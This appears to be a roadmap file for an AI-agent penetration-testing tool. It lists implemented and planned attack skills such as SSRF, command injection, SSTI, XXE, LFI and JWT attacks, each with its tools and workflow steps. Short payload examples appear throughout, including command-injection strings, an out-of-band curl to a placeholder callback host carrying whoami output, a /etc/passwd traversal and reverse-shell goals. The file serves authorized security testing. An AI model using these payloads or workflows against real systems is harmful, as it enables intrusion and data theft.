# Attack Skills Roadmap

Future attack skills to implement following the prompt-based pattern established by SQLi and XSS.

## Current Implementation Status

### Implemented (6 Built-in Skills)

| Skill | Tool | OOB Callbacks | Status |
|-------|------|---------------|--------|
| CVE Exploit | Metasploit | N/A | Done |
| Brute Force | Hydra | N/A | Done |
| Phishing/Social Engineering | msfvenom, MSF modules | N/A | Done |
| Denial of Service | slowhttptest, hping3, MSF | N/A | Done |
| SQL Injection | SQLMap | Interactsh | Done |
| XSS | Dalfox | Interactsh | Done |

---

## Planned Attack Skills

### Priority 1: High Impact, Common in Pentests

#### 1. SSRF (Server-Side Request Forgery)
**Tool:** SSRFmap, Gopherus
**OOB Support:** Yes (Interactsh)
**Complexity:** Medium

**Features to implement:**
- Cloud metadata endpoint detection (AWS/GCP/Azure/DigitalOcean)
- Internal port scanning via SSRF
- Protocol smuggling (gopher://, dict://, file://)
- Blind SSRF with OOB callbacks
- Filter bypass techniques (DNS rebinding, URL encoding, IPv6)
- SSRFmap automation for common payloads

**Workflow:**
1. Target analysis - identify URL parameters, redirects, webhooks
2. Quick detection with common payloads
3. Cloud metadata check (169.254.169.254, metadata.google.internal)
4. Internal network scanning
5. Protocol smuggling attempts
6. OOB callback for blind SSRF

---

#### 2. Command Injection (OS Command Injection)
**Tool:** Commix
**OOB Support:** Yes (Interactsh DNS/HTTP)
**Complexity:** Medium

**Features to implement:**
- Results-based injection (output in response)
- Time-based blind injection
- File-based injection (write to accessible path)
- OOB DNS/HTTP exfiltration
- Filter bypass (encoding, newlines, env variables)
- Commix automation with tamper scripts

**Payload categories:**
- Basic: `; id`, `| whoami`, `$(id)`, `` `id` ``
- Blind time: `; sleep 5`, `| timeout 5`
- Blind OOB: `; curl http://CALLBACK/$(whoami)`
- Filter bypass: `${IFS}`, `$'\x0a'`, `%0a`

---

#### 3. SSTI (Server-Side Template Injection)
**Tool:** tplmap
**OOB Support:** Yes (code execution → callbacks)
**Complexity:** Medium

**Features to implement:**
- Template engine detection (Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, ERB)
- Automatic payload generation per engine
- Sandbox escape techniques
- Code execution and file read
- Blind SSTI with OOB callbacks

**Workflow:**
1. Inject polyglot `{{7*7}}` / `${7*7}` / `<%= 7*7 %>`
2. Identify template engine from response
3. Use tplmap for automated exploitation
4. Attempt sandbox escape for RCE
5. Extract files or establish reverse shell

---

### Priority 2: Modern Application Attacks

#### 4. NoSQL Injection
**Tool:** NoSQLMap, manual techniques
**OOB Support:** No (direct response)
**Complexity:** Low

**Targets:** MongoDB, CouchDB, Redis, Cassandra

**Features to implement:**
- Authentication bypass (`{"$gt": ""}`)
- Data extraction via operator injection
- Blind boolean-based injection
- JavaScript injection in MongoDB
- Time-based detection

---

#### 5. XXE (XML External Entity Injection)
**Tool:** XXEinjector, manual payloads
**OOB Support:** Yes (OOB DTD exfiltration)
**Complexity:** Medium

**Features to implement:**
- Classic XXE (file read via entity)
- Blind XXE with OOB DTD server
- Error-based XXE
- SSRF via XXE
- Billion laughs DoS detection
- Filter bypass (encoding, parameter entities)

**OOB Setup:**
- Host malicious DTD file
- Use Interactsh for HTTP/DNS callbacks
- Parse exfiltrated data from callback logs

---

#### 6. LFI/RFI (Local/Remote File Inclusion)
**Tool:** LFISuite, dotdotpwn
**OOB Support:** Yes (RFI → reverse shell)
**Complexity:** Medium

**Features to implement:**
- Path traversal detection (`../../../etc/passwd`)
- Null byte bypass (`%00`)
- Double encoding bypass
- PHP wrapper exploitation (php://filter, php://input, data://)
- Log poisoning (Apache/Nginx logs, SSH auth.log)
- RFI for remote code execution
- /proc/self/environ exploitation

---

### Priority 3: API & Protocol-Specific

#### 7. JWT Attacks
**Tool:** jwt_tool
**OOB Support:** No
**Complexity:** Low

**Features to implement:**
- Algorithm confusion (none, HS256→RS256)
- Key bruteforcing
- JKU/X5U injection
- KID injection (SQLi, path traversal)
- Claim tampering
- Token expiration bypass

---

#### 8. GraphQL Attacks
**Tool:** graphql-cop, InQL, graphw00f
**OOB Support:** No
**Complexity:** Low

**Features to implement:**
- Introspection query extraction
- Field suggestion detection
- Batching attacks
- Depth/complexity DoS
- Authorization bypass
- Mutation abuse
- Alias-based rate limit bypass

---

#### 9. WebSocket Attacks
**Tool:** STEWS, ws-harness
**OOB Support:** No
**Complexity:** Medium

**Features to implement:**
- Cross-Site WebSocket Hijacking (CSWSH)
- Message manipulation
- SQLi/XSS through WebSocket messages
- Authentication token theft
- Rate limiting bypass

---

### Priority 4: Advanced/Complex

#### 10. Insecure Deserialization
**Tool:** ysoserial, JNDI-Exploit-Kit, marshalsec
**OOB Support:** Yes (JNDI/RMI callbacks)
**Complexity:** High

**Targets:** Java, PHP, Python, .NET, Ruby

**Features to implement:**
- Gadget chain detection
- ysoserial payload generation
- JNDI injection (Log4Shell style)
- PHP object injection
- Python pickle exploitation

---

#### 11. HTTP Request Smuggling
**Tool:** smuggler.py, HTTP Request Smuggler (Burp)
**OOB Support:** No
**Complexity:** High

**Features to implement:**
- CL.TE detection
- TE.CL detection
- TE.TE obfuscation
- Request smuggling for cache poisoning
- Request smuggling for auth bypass

---

## Implementation Pattern

All new skills should follow this structure:

```
agentic/prompts/{skill}_prompts.py
├── {SKILL}_TOOLS          # Main workflow with steps
├── {SKILL}_OOB_WORKFLOW   # Interactsh callback setup (if applicable)
└── {SKILL}_PAYLOAD_REFERENCE  # Payload cheatsheet
```

**Required changes per skill:**
1. `prompts/{skill}_prompts.py` - Create workflow prompts
2. `prompts/classification.py` - Add to `_BUILTIN_SKILL_MAP` and `_CLASSIFICATION_INSTRUCTIONS`
3. `prompts/__init__.py` - Add imports and routing in `_inject_builtin_skill_workflow()`
4. `project_settings.py` - Add settings and `get_{skill}_settings_dict()`
5. `state.py` - Add to `KNOWN_ATTACK_PATHS`
6. `webapp/prisma/schema.prisma` - Add setting fields
7. `webapp/.../AttackSkillsSection.tsx` - Add to UI
8. `webapp/.../sections/{Skill}Section.tsx` - Create settings component

---

## Contributing

When implementing a new skill:

1. Research the best tool(s) for the attack type
2. Document the workflow steps (target analysis → detection → exploitation → evidence)
3. Include WAF/filter bypass techniques where applicable
4. Add OOB callback support using Interactsh pattern if blind detection needed
5. Follow the SQLi/XSS implementation as reference
6. Test format placeholders with `get_{skill}_settings_dict()`
7. Update this roadmap with implementation status

---

## References

- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- PortSwigger Web Security Academy: https://portswigger.net/web-security
